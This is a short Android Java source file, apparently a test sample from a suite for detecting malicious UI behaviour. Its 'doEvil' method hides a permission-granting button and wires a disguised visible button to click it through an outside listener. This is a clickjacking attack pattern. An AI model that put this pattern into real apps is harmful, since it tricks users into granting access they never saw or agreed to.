package com.example.evildoers.progclicks.simple;

import android.app.Activity;
import android.view.View;
import android.widget.Button;
import com.example.listeners.MaliciousViewListener;

/**
 * Programmatically click an ACG indirectly, through a listener to another button.
 * The listener here is outside of the actual class, to make the flow slightly more complex.
 */
public class IndirectOutsideEvilDoer extends ProgClickEvilDoer {

    protected int userExposedButtonId;

    public IndirectOutsideEvilDoer(int viewToClickId, int userExposedButtonId) {
        super(viewToClickId);
        this.userExposedButtonId = userExposedButtonId;
    }

    @Override
    public void doEvil(Activity activity) {
        // Let's hide the ACG button first
        final View buttonToClick = getViewToClick(activity);
        buttonToClick.setVisibility(View.INVISIBLE);

        // Now set the listener for the disguised malicious button
        Button button = (Button) activity.findViewById(userExposedButtonId);
        button.setOnClickListener(new MaliciousViewListener(buttonToClick));
    }
}
